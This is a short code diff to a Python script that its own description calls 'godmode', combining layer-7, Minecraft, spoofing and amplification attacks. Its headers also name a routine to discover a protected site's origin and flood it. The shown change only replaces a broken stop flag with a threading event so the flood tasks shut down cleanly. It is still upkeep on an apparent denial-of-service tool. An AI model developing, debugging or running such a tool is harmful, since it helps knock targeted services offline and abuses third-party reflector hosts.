@@ -658,7 +658,8 @@ AMP_METHODS = {
 # ============================================================
 #  MAIN
 # ============================================================
-STOP = None
+import threading
+STOP = threading.Event()
 
 # ============================================================
 #  FULL BYPASS — discover origin + verify + flood
@@ -748,12 +749,7 @@ async def full_bypass(domain, port, duration, conns, methods):
     return verified
 
 async def main():
-    global STOP, LOCK
-    STOP = asyncio.Event() if False else None
-    import threading
-    STOP_FLAG = {"v": False}
-    globals()["STOP"] = STOP_FLAG
-
+    global LOCK
     ap = argparse.ArgumentParser(description="godmode — L7 + Minecraft + spoofing + amp")
     ap.add_argument("target", nargs="?")
     ap.add_argument("-p", "--port", type=int, default=80)
@@ -772,10 +768,9 @@ async def main():
     if not args.confirm:
         print("refusing: pass --confirm"); return
 
-    global STOP
-    STOP = False
     LOCK = asyncio.Lock()
     globals()["LOCK"] = LOCK
+    STOP.clear()
 
     port = 443 if (args.ssl and args.port == 80) else args.port
     reflectors = []
@@ -815,7 +810,7 @@ async def main():
     pt = asyncio.create_task(prog())
 
     await asyncio.gather(*tasks, return_exceptions=True)
-    STOP = True
+    STOP.set()
     await pt
 
     async with LOCK:
